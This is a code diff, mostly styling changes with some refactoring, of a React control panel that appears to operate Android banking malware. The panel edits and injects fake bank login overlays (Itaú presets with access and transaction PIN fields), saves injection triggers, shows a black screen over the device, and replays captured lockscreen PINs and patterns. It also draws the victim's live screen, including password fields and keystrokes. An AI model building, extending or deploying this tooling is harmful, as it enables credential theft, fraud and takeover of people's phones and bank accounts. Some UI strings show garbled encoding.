                     <span className="text-gray-400 text-xs">Delay:</span>
                     <input
                       type="number"
                       value={pinDelay}
                       onChange={(e) => setPinDelay(Number(e.target.value))}
-                      className="w-16 bg-slate-700 border border-blue-500/25 rounded px-2 py-1 text-white text-xs text-center"
+                      className="w-16 bg-[#2a2a31] border border-[#2a2a31]/25 rounded px-2 py-1 text-white text-xs text-center"
                     />
                     <span className="text-gray-500 text-xs">ms</span>
                   </div>
                   <button
                     onClick={playLockSequence}
                     disabled={isPlayingPin}
-                    className={`w-full py-2 rounded-lg font-bold text-sm transition-all ${
+                    className={`w-full py-2 rounded-md font-bold text-sm transition-all ${
                       isPlayingPin
                         ? 'bg-gray-600 text-gray-400 cursor-not-allowed'
                         : lockscreenType === 'PIN'
-                          ? 'bg-gradient-to-r from-yellow-600 to-orange-600 hover:from-yellow-700 hover:to-orange-700 text-white'
-                          : 'bg-gradient-to-r from-blue-600 to-pink-600 hover:from-blue-700 hover:to-pink-700 text-white'
+                          ? 'bg-gradient-to-r from-yellow-600 to-[#84cc16] hover:from-yellow-700 hover:to-orange-700 text-white'
+                          : 'bg-gradient-to-r from-[#ef4444] to-[#65a30d] hover:from-[#ef4444] hover:to-[#4d7c0f] text-[#10120a]'
                     }`}
                   >
-                    {isPlayingPin ? '³ Reproduzindo...' : `”“ Reproduzir ${lockscreenType}`}
+                    {isPlayingPin ? '³ Reproduzindo...' : ` Reproduzir ${lockscreenType}`}
                   </button>
                 </div>
               </div>
@@ -13833,11 +13912,11 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               onFocus={() => bringToFront('editBankScreens')}
               onDrag={(x, y) => updateWindowPosition('editBankScreens', x, y)}
               onResize={(w, h) => updateWindowSize('editBankScreens', w, h)}
-              headerColor="bg-gradient-to-r from-pink-700 to-rose-700"
+              headerColor="bg-gradient-to-r from-[#4d7c0f] to-rose-700"
             >
               <div className="flex flex-col md:flex-row text-slate-200 h-full overflow-hidden bg-[#2b0903]/95">
                 {/* Lateral Esquerda - Selector de Bancos e Form de Edição */}
-                <div className="w-full md:w-1/2 border-r border-cyan-500/10 flex flex-col bg-[#300a03]/70 overflow-hidden h-full">
+                <div className="w-full md:w-1/2 border-r border-[#2a2a31]/10 flex flex-col bg-[#300a03]/70 overflow-hidden h-full">
                   <div className="flex-1 overflow-y-auto p-4 space-y-4">
                     {/* Selector de Presets */}
                     <div>
@@ -13849,10 +13928,10 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             <button
                               key={screen.id}
                               onClick={() => selectPreset(screen.id)}
-                              className={`py-2 px-3 rounded-lg border text-xs font-bold font-mono transition-all flex items-center justify-center gap-1.5 ${
+                              className={`py-2 px-3 rounded-md border text-xs font-bold font-mono transition-all flex items-center justify-center gap-1.5 ${
                                 isSelected
-                                  ? 'bg-gradient-to-r from-pink-600/30 to-rose-600/10 border-pink-500/80 text-white shadow-[0_0_10px_rgba(236,72,153,0.15)] text-center'
-                                  : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:text-white hover:bg-slate-800/40 text-center'
+                                  ? 'bg-gradient-to-r from-[#65a30d]/30 to-[#84cc16]/10 border-pink-500/80 text-white shadow-[0_0_10px_rgba(236,72,153,0.15)] text-center'
+                                  : 'bg-[#121214]/60 border-[#24242a] text-slate-400 hover:text-white hover:bg-[#24242a]/40 text-center'
                               }`}
                             >
                               {screen.name.split('-')[0].trim()}
@@ -13862,7 +13941,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                       </div>
                     </div>
 
-                    <div className="border-t border-slate-800 my-2"></div>
+                    <div className="border-t border-[#24242a] my-2"></div>
 
                     {/* Inputs de customização */}
                     <div className="space-y-3">
@@ -13872,7 +13951,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                           type="text"
                           value={editBankPackage}
                           onChange={(e) => setEditBankPackage(e.target.value)}
-                          className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
+                          className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
                           placeholder="Ex: br.com.itau"
                         />
                       </div>
@@ -13886,7 +13965,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditBankLogoText(e.target.value);
                               handleUpdateCurrentScreenProperty('logo', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                           />
                         </div>
                         <div>
@@ -13898,7 +13977,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditBankTitle(e.target.value);
                               handleUpdateCurrentScreenProperty('title', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                           />
                         </div>
                       </div>
@@ -13911,7 +13990,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                             handleUpdateCurrentScreenProperty('desc', e.target.value);
                           }}
                           rows={2}
-                          className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 resize-none"
+                          className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 resize-none"
                         />
                       </div>
                       <div className="grid grid-cols-2 gap-2">
@@ -13924,7 +14003,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditBankPlaceholder(e.target.value);
                               handleUpdateCurrentScreenProperty('placeholder', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                           />
                         </div>
                         <div>
@@ -13936,21 +14015,21 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditBankButtonText(e.target.value);
                               handleUpdateCurrentScreenProperty('buttonText', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500"
                           />
                         </div>
                       </div>
                       {selectedPresetScreenId.includes('itau') && (
-                        <div className="bg-orange-950/40 border border-orange-500/50 rounded-lg p-2.5 my-2">
-                          <label className="block text-[11px] font-bold text-orange-400 uppercase tracking-wider mb-1 flex items-center gap-1">
-                            <span>🔢</span> Quantidade de Dígitos (Bolinhas):
+                        <div className="bg-orange-950/40 border border-[#ef4444]/50 rounded-md p-2.5 my-2">
+                          <label className="block text-[11px] font-bold text-[#f87171] uppercase tracking-wider mb-1 flex items-center gap-1">
+                            <span></span> Quantidade de Dígitos (Bolinhas):
                           </label>
                           <select
                             value={editBankDigitsOption}
                             onChange={(e) => handleUpdateItauDigits(e.target.value)}
-                            className="w-full bg-slate-950/90 border border-orange-500/60 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-orange-400 font-mono font-bold"
+                            className="w-full bg-slate-950/90 border border-[#ef4444]/60 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-[#f87171] font-mono font-bold"
                           >
-                            <option value="6,4">6 Dígitos (Acesso) + 4 Dígitos (Transação) [Padrão🏦 Itaú]</option>
+                            <option value="6,4">6 Dígitos (Acesso) + 4 Dígitos (Transação) [Padrão Itaú]</option>
                             <option value="4,4">4 Dígitos em Ambos os Passos (4 Bolinhas)</option>
                             <option value="6,6">6 Dígitos em Ambos os Passos (6 Bolinhas)</option>
                             <option value="4,6">4 Dígitos (Acesso) + 6 Dígitos (Transação)</option>
@@ -13968,7 +14047,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                               setEditBankBgColor(e.target.value);
                               handleUpdateCurrentScreenProperty('bgColor', e.target.value);
                             }}
-                            className="w-full bg-slate-950/80 border border-slate-800 rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
+                            className="w-full bg-slate-950/80 border border-[#24242a] rounded px-3 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
                           />
                         </div>
                         <div>
@@ -13990,34 +14069,34 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                 setEditBankBtnColor(e.target.value);
                                 handleUpdateCurrentScreenProperty('btnColor', e.target.value);
                               }}
-                              className="w-full bg-slate-950/80 border border-slate-800 rounded px-2 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
+                              className="w-full bg-slate-950/80 border border-[#24242a] rounded px-2 py-1.5 text-xs text-white focus:outline-none focus:border-pink-500 font-mono"
                             />
                           </div>
                         </div>
                       </div>
                     </div>
 
-                    <div className="flex gap-2 pt-3 border-t border-slate-800 flex-shrink-0">
+                    <div className="flex gap-2 pt-3 border-t border-[#24242a] flex-shrink-0">
                       <button
                         onClick={() => setShowBankVisualEditor(true)}
-                        className="flex-1 py-2.5 bg-gradient-to-r from-blue-600 to-indigo-500 hover:from-blue-500 hover:to-indigo-400 text-white font-bold rounded-xl text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(220,38,38,0.25)] flex items-center justify-center gap-1"
+                        className="flex-1 py-2.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] font-bold rounded-md text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(239,68,68,0.25)] flex items-center justify-center gap-1"
                       >
-                        🎨 Editor Visual
+                         Editor Visual
                       </button>
                       <button
                         onClick={() => {
                           const compiled = getCompiledBankTemplate();
                           if (compiled) applyCustomBlackScreen(compiled, editBankPackage);
                         }}
-                        className="flex-1 py-2.5 bg-gradient-to-r from-pink-600 to-rose-500 hover:from-pink-500 hover:to-rose-400 text-white font-bold rounded-xl text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(236,72,153,0.3)] flex items-center justify-center gap-1"
+                        className="flex-1 py-2.5 bg-gradient-to-r from-[#65a30d] to-[#ef4444] hover:from-pink-500 hover:to-rose-400 text-white font-bold rounded-md text-[10px] uppercase tracking-wider transition-all shadow-[0_0_10px_rgba(236,72,153,0.3)] flex items-center justify-center gap-1"
                       >
-                        ⚡ Injetar Agora
+                         Injetar Agora
                       </button>
                       <button
                         onClick={saveCustomBankMapping}
-                        className="flex-1 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 font-bold rounded-xl text-[10px] uppercase tracking-wider transition-all flex items-center justify-center gap-1"
+                        className="flex-1 py-2.5 bg-[#24242a] hover:bg-[#2a2a31] text-slate-200 border border-[#2a2a31] font-bold rounded-md text-[10px] uppercase tracking-wider transition-all flex items-center justify-center gap-1"
                       >
-                        💾 Salvar Gatilho
+                         Salvar Gatilho
                       </button>
                     </div>
                   </div>
@@ -14025,15 +14104,15 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
 
                 {/* Lateral Direita - Live Preview */}
                 <div className="flex-1 flex flex-col items-center justify-center bg-[#200603] p-4 overflow-hidden relative h-full">
-                  <div className="absolute top-3 left-4 text-[10px] text-slate-500 font-mono">LIVE PREVIEW</div>
+                  <div className="absolute top-3 left-4 text-[10px] text-[#8b8b94] font-mono">LIVE PREVIEW</div>
                   
                   {/* Celular Mockup */}
-                  <div className="w-[280px] h-[500px] rounded-[36px] border-[8px] border-slate-800 bg-black relative shadow-[0_20px_50px_rgba(0,0,0,0.5)] overflow-hidden flex flex-col"
+                  <div className="w-[280px] h-[500px] rounded-[36px] border-[8px] border-[#24242a] bg-black relative shadow-[0_20px_50px_rgba(0,0,0,0.5)] overflow-hidden flex flex-col"
                        style={{ background: editBankBgColor }}>
                     
                     {/* Speaker Notch */}
-                    <div className="absolute top-2 left-1/2 transform -translate-x-1/2 w-28 h-4 bg-slate-900 rounded-full z-20 flex items-center justify-center">
-                      <div className="w-10 h-1 bg-slate-800 rounded-full"></div>
+                    <div className="absolute top-2 left-1/2 transform -translate-x-1/2 w-28 h-4 bg-[#121214] rounded-full z-20 flex items-center justify-center">
+                      <div className="w-10 h-1 bg-[#24242a] rounded-full"></div>
                     </div>
 
                     {/* Conteúdo Renderizado Dinamicamente */}
@@ -14133,7 +14212,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                       {el.imageUrl ? (
                                         <img src={el.imageUrl} alt="" className="max-w-full max-h-full object-contain" />
                                       ) : (
-                                        <span className="text-lg">📷</span>
+                                        <span className="text-lg"></span>
                                       )}
                                     </div>
                                   )}
@@ -14147,12 +14226,12 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                                     />
                                   )}
                                   {el.type === 'fingerprint' && (
-                                    <div className="w-full h-full flex flex-col items-center justify-center p-1 border border-dashed border-indigo-500/20 rounded bg-indigo-950/10">
+                                    <div className="w-full h-full flex flex-col items-center justify-center p-1 border border-dashed border-[#2a2a31]/20 rounded bg-[#121214]/10">
                                       <div
                                         className="rounded-full p-2 border animate-pulse"
                                         style={{ borderColor: el.biometricColor || '#00ff00' }}
                                       >
-                                        <span style={{ color: el.biometricColor || '#00ff00', fontSize: `${14 * scaleX}px` }}>🔑</span>
+                                        <span style={{ color: el.biometricColor || '#00ff00', fontSize: `${14 * scaleX}px` }}></span>
                                       </div>
                                     </div>
                                   )}
@@ -14171,7 +14250,7 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
         </div>
       )}
 
-      {/* –¼ LIGHTBOX MODAL PARA IMAGENS */}
+      {/* ¼ LIGHTBOX MODAL PARA IMAGENS */}
       {lightboxImage && (
         <div 
           className="fixed inset-0 bg-black/95 flex flex-col items-center justify-center z-[100] animate-fadeIn"
@@ -14185,21 +14264,21 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
                 link.download = lightboxName;
                 link.click();
               }}
-              className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold text-xs rounded-lg flex items-center gap-1.5 transition-all shadow-[0_0_15px_rgba(16,185,129,0.3)]"
+              className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold text-xs rounded-md flex items-center gap-1.5 transition-all shadow-[0_0_15px_rgba(16,185,129,0.3)]"
             >
               <Download className="w-3.5 h-3.5" />
               Baixar Imagem
             </button>
             <button
               onClick={() => setLightboxImage(null)}
-              className="p-2 bg-slate-900/80 border border-slate-700 hover:border-slate-500 text-slate-400 hover:text-white rounded-lg transition-all"
+              className="p-2 bg-[#121214]/80 border border-[#2a2a31] hover:border-[#8b8b94] text-slate-400 hover:text-white rounded-md transition-all"
             >
               <X className="w-5 h-5" />
             </button>
           </div>
           
           <div 
-            className="max-w-[90vw] max-h-[80vh] rounded-lg overflow-hidden border border-slate-800 shadow-[0_10px_50px_rgba(0,0,0,0.8)] relative"
+            className="max-w-[90vw] max-h-[80vh] rounded-md overflow-hidden border border-[#24242a] shadow-[0_10px_50px_rgba(0,0,0,0.8)] relative"
             onClick={(e) => e.stopPropagation()}
           >
             <img 
@@ -14207,14 +14286,14 @@ export default function DeviceControl({ onLogout }: DeviceControlProps) {
               alt={lightboxName} 
               className="max-w-full max-h-[80vh] object-contain"
             />
-            <div className="absolute bottom-0 left-0 right-0 bg-slate-950/80 backdrop-blur border-t border-slate-800/50 p-3 text-center">
+            <div className="absolute bottom-0 left-0 right-0 bg-slate-950/80 backdrop-blur border-t border-[#24242a]/50 p-3 text-center">
               <span className="text-white text-xs font-bold font-mono">{lightboxName}</span>
             </div>
           </div>
         </div>
       )}
 
-      {/* 🤖 Robô Assistente Interativo com Guia de Funções e Tela Preta */}
+      {/*  Robô Assistente Interativo com Guia de Funções e Tela Preta */}
       <RobotAssistant 
         initialCategory="device_control" 
         isOpen={showRobotTutorial} 
@@ -14251,7 +14330,7 @@ function FloatingWindow({
   onFocus, 
   onDrag, 
   onResize,
-  headerColor = 'bg-slate-700'
+  headerColor = 'bg-[#2a2a31]'
 }: FloatingWindowProps) {
   const [isDragging, setIsDragging] = useState(false);
   const [isResizing, setIsResizing] = useState(false);
@@ -14332,7 +14411,7 @@ function FloatingWindow({
   
   return (
     <div
-      className="fixed bg-[#440e05] rounded-2xl shadow-[0_10px_40px_rgba(0,0,0,0.6)] border border-cyan-500/30 overflow-hidden pointer-events-auto transition-all"
+      className="fixed bg-[#121214] rounded-md shadow-[0_10px_40px_rgba(0,0,0,0.6)] border border-[#2a2a31]/30 overflow-hidden pointer-events-auto transition-all"
       style={mobileStyle}
       onClick={onFocus}
     >
@@ -14355,18 +14434,18 @@ function FloatingWindow({
         }}
       >
         <div className="flex items-center space-x-2 text-white font-bold text-xs truncate max-w-[70%]">
-          <Move className="w-4 h-4 text-cyan-300 shrink-0" />
+          <Move className="w-4 h-4 text-[#ef4444] shrink-0" />
           <span className="truncate">{title}</span>
         </div>
         
         <div className="flex items-center space-x-1 shrink-0">
           <button
-            className="window-btn p-1.5 hover:bg-white/20 active:bg-white/30 rounded-lg transition-all"
+            className="window-btn p-1.5 hover:bg-white/20 active:bg-white/30 rounded-md transition-all"
             onClick={() => setIsMinimized(!isMinimized)}
           >
             {isMinimized ? <Maximize2 className="w-3.5 h-3.5 text-white" /> : <Minimize2 className="w-3.5 h-3.5 text-white" />}
           </button>
-          <button className="window-btn p-1.5 hover:bg-red-600 active:bg-red-700 rounded-lg transition-all" onClick={onClose}>
+          <button className="window-btn p-1.5 hover:bg-[#ef4444] active:bg-[#ef4444] rounded-md transition-all" onClick={onClose}>
             <X className="w-3.5 h-3.5 text-white" />
           </button>
         </div>
@@ -14390,7 +14469,7 @@ function FloatingWindow({
             onFocus();
           }}
         >
-          <svg className="w-4 h-4 text-cyan-500/60" viewBox="0 0 24 24" fill="currentColor">
+          <svg className="w-4 h-4 text-[#ef4444]/60" viewBox="0 0 24 24" fill="currentColor">
             <path d="M22 22H20V20H22V22ZM22 18H20V16H22V18ZM18 22H16V20H18V22ZM22 14H20V12H22V14ZM18 18H16V16H18V18ZM14 22H12V20H14V22Z" />
           </svg>
         </div>
@@ -14511,7 +14590,7 @@ const ScreenReaderCanvas = ({
       ctx.scale(dpr, dpr);
       
       // Fundo escuro tecnológico
-      ctx.fillStyle = '#02050c';
+      ctx.fillStyle = '#0c0202';
       ctx.fillRect(0, 0, devW, devH);
 
       // Grade de blueprint cibernética (condicional)
@@ -14535,15 +14614,31 @@ const ScreenReaderCanvas = ({
 
       if (hierarchy) {
         // Coleta TODOS os elementos visíveis (folhas sem filhos OU com texto)
-        const allNodes: ScreenReaderNode[] = [];
-        collectAllVisibleNodes(hierarchy, allNodes);
-        
-        // Ordena por área (maiores primeiro, para desenhar containers antes)
-        allNodes.sort((a, b) => {
+        const raw: ScreenReaderNode[] = [];
+        collectAllVisibleNodes(hierarchy, raw);
+
+        raw.sort((a, b) => {
           const areaA = (a.bounds?.w || 0) * (a.bounds?.h || 0);
           const areaB = (b.bounds?.w || 0) * (b.bounds?.h || 0);
           return areaB - areaA;
         });
+
+        const allNodes: ScreenReaderNode[] = [];
+        for (const n of raw) {
+          const t = ((n.text || '').trim() || (n.desc || '').trim()).toLowerCase();
+          if (t && n.bounds) {
+            const cx = n.bounds.x + n.bounds.w / 2;
+            const cy = n.bounds.y + n.bounds.h / 2;
+            let dup = false;
+            for (const k of allNodes) {
+              const kt = ((k.text || '').trim() || (k.desc || '').trim()).toLowerCase();
+              if (kt !== t || !k.bounds) continue;
+              if (Math.abs(cx - (k.bounds.x + k.bounds.w / 2)) < 110 && Math.abs(cy - (k.bounds.y + k.bounds.h / 2)) < 130) { dup = true; break; }
+            }
+            if (dup) continue;
+          }
+          allNodes.push(n);
+        }
         
         // Desenha todos os elementos
         allNodes.forEach(node => {
@@ -14572,7 +14667,7 @@ const ScreenReaderCanvas = ({
         ctx.restore();
       }
 
-      // Desenho🏦 Interativo do Pattern Lock na Tela V2
+      // Desenho Interativo do Pattern Lock na Tela V2
       if (patternMode || (patternDrawn && patternDrawn.length > 0)) {
         ctx.save();
         
@@ -14665,9 +14760,9 @@ const ScreenReaderCanvas = ({
             ctx.lineTo(patternDragPos.x, patternDragPos.y);
           }
 
-          ctx.strokeStyle = '#ff2b2b';
+          ctx.strokeStyle = '#ef4444';
           ctx.lineWidth = 6;
-          ctx.shadowColor = '#ff2b2b';
+          ctx.shadowColor = '#ef4444';
           ctx.shadowBlur = 14;
           ctx.lineCap = 'round';
           ctx.lineJoin = 'round';
@@ -14683,8 +14778,8 @@ const ScreenReaderCanvas = ({
 
           ctx.save();
           if (isSelected) {
-            ctx.fillStyle = '#ff2b2b';
-            ctx.shadowColor = '#ff2b2b';
+            ctx.fillStyle = '#ef4444';
+            ctx.shadowColor = '#ef4444';
             ctx.shadowBlur = 16;
             ctx.beginPath();
             ctx.arc(p.x, p.y, p.r * 1.5, 0, Math.PI * 2);
@@ -14720,7 +14815,7 @@ const ScreenReaderCanvas = ({
         ctx.textAlign = 'center';
         ctx.textBaseline = 'middle';
         const pText = (patternDrawn && patternDrawn.length > 0) ? patternDrawn.join(' - ') : 'Arraste entre os pontos (1 a 9)';
-        ctx.fillText(`🔓 MODO PADRO: ${pText}`, devW / 2, 15);
+        ctx.fillText(` MODO PADRO: ${pText}`, devW / 2, 15);
         ctx.restore();
 
         ctx.restore();
@@ -14786,23 +14881,22 @@ const isKeyboardKey = (node: ScreenReaderNode): boolean => {
 // Coleta TODOS os elementos visíveis (não só os com texto)
 const collectAllVisibleNodes = (node: ScreenReaderNode, nodes: ScreenReaderNode[]) => {
   if (!node || !node.bounds) return;
-  
   const { x, y, w, h } = node.bounds;
-  
-  // Ignora elementos fora da tela ou muito pequenos
   if (x + w < -100 || y + h < -100) return;
   if (w < 4 || h < 4) return;
-  
-  // Coleta se for folha (sem filhos) ou se tiver algum identificador/texto relevante
-  const hasDetails = node.text || node.desc || node.hint || node.password || node.clickable || node.editable || node.isPinDigit || node.id;
-  if (!node.children || (Array.isArray(node.children) && node.children.length === 0) || hasDetails) {
-    nodes.push(node);
+
+  const kids = Array.isArray(node.children) ? node.children : [];
+  const txt = (node.text || '').trim() || (node.desc || '').trim();
+  const interactive = !!(node.clickable || node.editable || node.password || node.isPinDigit);
+
+  if (kids.length === 0) {
+    if (txt || interactive || node.id) nodes.push(node);
+  } else if (txt && interactive) {
+    const same = kids.some((k: any) => (((k.text || '').trim() || (k.desc || '').trim()) === txt));
+    if (!same) nodes.push(node);
   }
-  
-  // Sempre processa filhos
-  if (node.children && Array.isArray(node.children)) {
-    node.children.forEach(child => collectAllVisibleNodes(child, nodes));
-  }
+
+  kids.forEach((child: ScreenReaderNode) => collectAllVisibleNodes(child, nodes));
 };
 
 // Detecta se é elemento de lockscreen
@@ -14826,9 +14920,9 @@ const isLockScreenElement = (node: ScreenReaderNode): boolean => {
 
 // Desenha um elemento individual
 const drawElement = (
-  ctx: CanvasRenderingContext2D, 
-  node: ScreenReaderNode, 
-  textScale: number, 
+  ctx: CanvasRenderingContext2D,
+  node: ScreenReaderNode,
+  textScale: number,
   designTheme: 'cyan' | 'matrix' | 'neon-red' | 'purple-glowing',
   opacity: number = 0.7,
   cornerStyle: 'brackets' | 'full-border' | 'dots' | 'none' = 'brackets',
@@ -14836,338 +14930,108 @@ const drawElement = (
 ) => {
   if (!node || !node.bounds) return;
   const { x, y, w, h } = node.bounds;
-  let text = node.text?.trim() || node.desc?.trim() || '';
-  
-  // Tenta obter texto de extras (para teclados Android 12+)
+  if (w < 3 || h < 3) return;
+
   const nodeAny = node as any;
+  let text = node.text?.trim() || node.desc?.trim() || '';
   if (!text && nodeAny.extra_text) text = nodeAny.extra_text;
   if (!text && nodeAny.extra_label) text = nodeAny.extra_label;
   if (!text && nodeAny.tooltip) text = nodeAny.tooltip;
   if (!text && nodeAny.stateDesc) text = nodeAny.stateDesc;
-  
-  // Se for campo de senha, mostra indicador especial
-  if (node.password && text) {
-    // Conta quantos caracteres tem (remove —)
-    const cleanText = text.replace(/—/g, '');
-    const dotCount = (text.match(/—/g) || []).length;
-    if (dotCount > 0) {
-      text = `🔑 [${dotCount} dígitos digitados]`;
-    } else if (cleanText) {
-      text = `🔑 ${cleanText}`;
-    }
-  } else if (node.password && !text) {
-    text = '🔑 [CAMPO SENHA]';
-  }
-  
-  // Se for campo editável (input) sem texto, mostra hint
-  if (node.editable && !text && node.hint) {
-    text = `“ ${node.hint}`;
-  }
-  
+  if (text === 'true' || text === 'false') text = '';
+
   const isInput = isInputField(node);
-  const isKey = isKeyboardKey(node);
+  const isKey = isKeyboardKey(node) || nodeAny.isKeyboardKey === true;
   const isLock = isLockScreenElement(node);
-  const isKeyboardKeyNode = nodeAny.isKeyboardKey === true;
-  
-  // Para teclas de teclado sem texto, mostra um símbolo baseado no tipo
-  if ((isKey || isKeyboardKeyNode) && !text) {
-    const keyType = nodeAny.keyType || '';
-    if (keyType === 'special') {
-      // Tecla especial (espaço, enter, etc) - mais larga
-      if (w > h * 2.5) {
-        text = '⎵'; // Espaço
-      } else {
-        text = 'Ž'; // Enter/Return
-      }
-    } else if (keyType === 'medium') {
-      text = '⌫'; // Backspace
-    } else {
-      // Tecla normal - mostra um quadrado indicando tecla
-      text = '▪';
-    }
-  }
-  
-  // Define cores baseadas no tipo de elemento - Estética translúcida com brilho neon
-  let bgColor = 'rgba(22, 6, 6, 0.7)'; // Slate-900 translúcido
-  let borderColor = 'rgba(156, 128, 128, 0.4)'; // Slate-500
-  let textColor = '#f1f5f9';
-  let borderWidth = 1;
-  
-  // CORES BASEADAS NO TEMA SELECIONADO
-  if (designTheme === 'matrix') {
-    // Tema Hacker Matrix (Verde🏦 Neon)
-    bgColor = 'rgba(0, 15, 0, 0.65)';
-    borderColor = 'rgba(0, 255, 70, 0.35)';
-    textColor = '#39ff14';
-    if (node.password) {
-      bgColor = 'rgba(100, 0, 0, 0.7)';
-      borderColor = '#ff3131';
-      textColor = '#ffffff';
-    } else if (isInput) {
-      borderColor = '#00ff46';
-      borderWidth = 2.5;
-    } else if (node.clickable) {
-      borderColor = 'rgba(0, 255, 70, 0.8)';
-      borderWidth = 1.5;
-    }
-  } else if (designTheme === 'neon-red') {
-    // Tema Cyber Red (Laranja/Vermelho🏦 Neon)
-    bgColor = 'rgba(25, 0, 0, 0.75)';
-    borderColor = 'rgba(239, 68, 68, 0.35)';
-    textColor = '#f87171';
-    if (node.password) {
-      bgColor = 'rgba(220, 38, 38, 0.4)';
-      borderColor = '#ff0055';
-      textColor = '#FFF';
-      borderWidth = 2.5;
-    } else if (isInput) {
-      borderColor = '#ff9900';
-      textColor = '#ffd000';
-      borderWidth = 2;
-    } else if (node.clickable) {
-      borderColor = '#ef4444';
-      borderWidth = 1.5;
-    }
-  } else if (designTheme === 'purple-glowing') {
-    // Tema Roxo Fantasma (Deep Purple Glowing)
-    bgColor = 'rgba(35, 0, 6, 0.8)';
-    borderColor = 'rgba(239, 68, 68, 0.35)';
-    textColor = '#ffc9c9';
-    if (node.password) {
-      bgColor = 'rgba(236, 72, 153, 0.35)';
-      borderColor = '#f472b6';
-      textColor = '#FFF';
-      borderWidth = 2.5;
-    } else if (isInput) {
-      borderColor = '#ff6b6b';
-      borderWidth = 2.5;
-    } else if (node.clickable) {
-      borderColor = '#f65c8b';
-      borderWidth = 1.5;
-    }
-  } else {
-    // Tema Padrão (Modern Blue / Cyan)
-    if (node.isPinDigit) {
-      bgColor = 'rgba(217, 119, 6, 0.35)'; // Amber translúcido
-      borderColor = '#f59e0b'; // Amber-500 neon
-      textColor = '#fef3c7';
-      borderWidth = 2;
-    }
-    else if (node.isPatternLock) {
-      bgColor = 'rgba(239, 68, 68, 0.25)'; // Cyan translúcido
-      borderColor = '#ef4444'; // Cyan-500 neon
-      textColor = '#ecfeff';
-      borderWidth = 2;
-    }
-    else if (node.isSwipeUnlock) {
-      bgColor = 'rgba(16, 185, 129, 0.25)'; // Emerald translúcido
-      borderColor = '#10b981'; // Emerald-500 neon
-      textColor = '#ecfdf5';
-      borderWidth = 2;
-    }
-    else if (isLock) {
-      bgColor = 'rgba(239, 68, 68, 0.3)'; // Indigo translúcido
-      borderColor = '#ef4444'; // Indigo-500 neon
-      textColor = '#fff2ee';
-      borderWidth = 2;
-    }
-    else if (node.password) {
-      bgColor = 'rgba(220, 38, 38, 0.35)'; // Red escuro translúcido
-      borderColor = '#ef4444'; // Red-500 neon
-      textColor = '#fef2f2';
-      borderWidth = 2;
-    } else if (isInput) {
-      bgColor = 'rgba(22, 163, 74, 0.3)'; // Green escuro translúcido
-      borderColor = '#22c55e'; // Green-500 neon
-      textColor = '#f0fdf4';
-      borderWidth = 2;
-    } else if (isKey) {
-      bgColor = 'rgba(42, 18, 18, 0.85)'; // Slate-800
-      borderColor = 'rgba(201, 168, 168, 0.5)'; // Slate-400 sutil
-      textColor = '#f8fafc';
-      borderWidth = 1;
-    } else if (node.clickable) {
-      bgColor = 'rgba(220, 38, 38, 0.35)'; // Blue moderno translúcido
-      borderColor = '#ef4444'; // Blue-500 neon
-      textColor = '#fff5f5';
-      borderWidth = 1.5;
-    } else if (node.focused) {
-      bgColor = 'rgba(220, 38, 38, 0.35)'; // Purple translúcido
-      borderColor = '#ef4444'; // Purple-500 neon
-      textColor = '#faf5ff';
-      borderWidth = 2;
-    }
-  }
-  
-  // Desenha fundo com cantos arredondados
